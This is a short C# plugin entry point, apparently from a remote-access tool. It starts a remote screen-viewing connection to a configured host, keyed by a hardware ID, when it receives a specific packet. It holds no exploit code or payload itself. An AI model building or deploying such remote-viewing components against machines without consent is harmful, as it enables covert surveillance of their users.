using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;

        internal static RemoteViewerPacket remoteViewerBasePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.RM_VIEW_ON:
                    remoteViewerBasePacket = (RemoteViewerPacket)loadingAPI.currentPacket;
                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
                    clientHandler.ConnectStart();
                    break;
                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
